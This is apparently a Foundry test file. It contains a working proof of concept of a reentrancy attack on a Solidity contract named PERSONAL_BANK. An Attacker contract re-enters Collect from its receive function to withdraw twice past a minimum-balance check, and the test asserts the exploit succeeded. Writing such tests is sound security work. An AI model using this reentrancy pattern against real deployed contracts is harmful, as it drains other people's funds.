
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK, LogFile} from "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {
    PERSONAL_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PERSONAL_BANK();
        
        // Overwrite the hardcoded LogFile address to prevent reverts during Deposit/Collect
        _contractUnderTest.SetLogFile(address(_logFile));

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constraints: Ensure attackVal is significant but safe from overflow when doubled
        vm.assume(attackVal > 0.1 ether && attackVal < 1000 ether);
        
        // We set MinSum to twice the attack value.
        // This creates a scenario where a single withdrawal reduces the balance below MinSum,
        // preventing a second sequential withdrawal.
        // Reentrancy allows us to bypass this check before the balance is updated.
        uint256 totalDeposit = attackVal * 2;
        
        _contractUnderTest.SetMinSum(totalDeposit);

        // Fund the test contract so it can fund the attacker
        vm.deal(address(this), totalDeposit);

        // Setup: Attacker deposits the total amount (MinSum)
        _attacker.setupAttack{value: totalDeposit}(totalDeposit);
        
        // Attack: Attempt to withdraw attackVal twice (totaling totalDeposit)
        // This should only be possible via reentrancy because after the first deduction,
        // remaining balance < MinSum.
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PERSONAL_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        storedAttackVal = val;
        
        // Initiate the withdrawal
        _victim.Collect(val);

        // If we return here and attackCallCount > 1, it means we successfully re-entered
        // and executed logic that should have been blocked by the state update.
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        // Perform one re-entrant call
        if (attackCallCount < 2) {            
            _victim.Collect(storedAttackVal);
        }
    }
}
